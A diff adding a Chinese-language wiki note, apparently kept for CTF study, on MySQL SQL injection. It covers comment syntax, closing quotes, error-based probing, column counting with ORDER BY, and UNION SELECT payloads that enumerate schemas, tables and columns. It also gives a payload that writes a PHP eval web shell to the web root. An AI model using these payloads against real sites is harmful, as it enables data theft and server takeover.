@@ -1,0 +1,61 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-15T18:33:40+08:00
+
+====== sql注入 ======
+Created 星期五 15 十一月 2024
+
+https://hello-ctf.com/HC_Web/sql_injection/
+https://www.nssctf.cn/note/set/3597
+
+sql 语法：https://dev.mysql.com/doc/refman/8.4/en/sql-statements.html
+单行注释：通用：-- 注意--后面要有一个空格，或者--+ --\t --\n等控制字符也可以。
+mysql特有的是#
+在url构造中，#编码为%23，空格编码为+，因此最好在url中用--+
+多行注释：/* ... */
+SELECT: https://dev.mysql.com/doc/refman/8.4/en/select.html
+	LIMIT [offset,] row_count  其中offset从0开始
+	LIMIT row_count OFFSET offset
+
+对于 where id = ? 的问号位置，后台常见语句有
+$id
+'$id'
+"$id"
+($id)
+或他们的组合，如("'$id'")
+要想办法让符号闭合，这样后面的内容就可以自由构造，最后再加上注释符号--，取消掉原有的右引号。注意分号，视情况添加。
+
+通过报错判断后台语句：
+试探：1'  1"  '1  "1 等
+执行id = "1""，报错near '"1""' at line 1
+执行id = '1''，报错near'' 1''' at line 1
+执行id = ''1'，报错near '1'' at line 1
+
+判断列数：order by <col num>
+从1开始尝试增加列号，如果报错说明总列数小于该参数。假设有3列，一般是id, username, password
+
+使用union获取信息：
+	union 后面的表列数需要与前面一致，通过添加数字代替不够的列。
+	注意select后的列必须跟union前显示的列顺序一致。
+查看回显点：通过传入错误id -1，使得结果为union右边的表。
+id=-1' union SELECT 1,2,3 --+
+查询数据库信息：
+@@version、@@datadir
+查询连接数据库的用户名、地址：
+user()
+查询当前库名：
+union SELECT 1,database(),3
+获取所有数据库名：
+union SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata;--+
+获取当前数据库的所有表名：
+union SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database();--+
+获取指定表的所有列名：
+union SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='xxx';--+
+	x获取当前数据库的所有列名：
+	union SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=database();--+
+
+写入webshell：
+SELECT 1,2,'<?php @eval($_POST[shell])?>' into outfile '/var/www/html/shell.php'--+
+
+盲注猜数据
+
